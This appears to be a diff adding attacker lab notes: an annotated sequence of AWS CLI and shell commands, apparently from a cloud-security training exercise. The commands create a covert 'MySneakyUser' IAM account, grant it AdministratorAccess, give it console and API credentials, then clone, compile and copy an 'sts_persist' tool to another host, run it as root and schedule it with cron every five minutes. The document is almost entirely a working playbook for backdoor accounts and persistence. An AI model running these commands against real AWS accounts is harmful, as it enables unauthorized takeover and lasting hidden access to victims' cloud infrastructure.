@@ -1,0 +1,85 @@
+~~~ Creating an AWS User ~~~
+
+aws iam list-users # list current AWS users
+
+aws iam create-user --user-name MySneakyUser # create new user
+
+aws iam list-groups # find the group with the highest permissions
+
+aws iam add-user-to-group --group-name AdministratorAccess --user-name MyUsername # add user to admin group
+
+aws iam list-groups-for-user --user-name MyUsername # verify user is in group
+
+aws iam list-attached-user-policies --user-name admin_user # examine policies attached to admin_user
+
+aws iam attach-user-policy --user-name MySneakyUser --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" # add specific policy to new user
+
+aws iam attach-user-policy --user-name MySneakyUser --policy-arn "arn:aws:iam::aws:policy/IAMUserChangePassword" # add specific policy to new user
+
+aws iam list-attached-user-policies --user-name MySneakyUser # verify policies were attached
+
+
+~~~ Get Console Access ~~~
+
+aws iam create-login-profile --user-name MySneakyUser --password 16liftFRONTsold23 # create a console login for new user
+
+aws sts get-caller-identity # get the account number to allow console login
+
+aws iam list-users
+
+
+~~~ Get API Access ~~~
+
+aws iam create-access-key --user-name MySneakyUser # create AWS API keys for new user
+
+aws sts get-session-token # create session token
+
+
+~~~ STS Persist ~~~
+
+cd /opt
+
+git clone https://github.com/cno-io/sts_persist.git
+
+cd /opt/sts_persist
+
+ifconfig eth0
+
+ls
+
+vi run.py
+
+vi sts_persist.py
+
+mkdir /shared
+
+cp sts_persist.py /shared/
+
+cnoio_pyinstaller -y --clean --onefile /shared/sts_persist.py
+
+ls -alF /shared/dist/
+
+file /shared/dist/sts_persist
+
+scp -i ~/.ssh/ssti_key /shared/dist/sts_persist ubuntu@10.0.2.36:/tmp/sts_persist
+
+ls -alF ~/.aws/
+
+python run.py
+
+ssh -i ssti_key ubuntu@10.0.2.36
+
+sudo su -
+
+cd /tmp
+
+./sts_persist
+
+aws sts get-caller-identity --profile 480927147553:awstrainingstack001-bluelizardPrivEC2Role-16N8SQZR1JKII
+
+crontab -e
+
+*/5 * * * * /tmp/sts_persist
+
+crontab -l
+
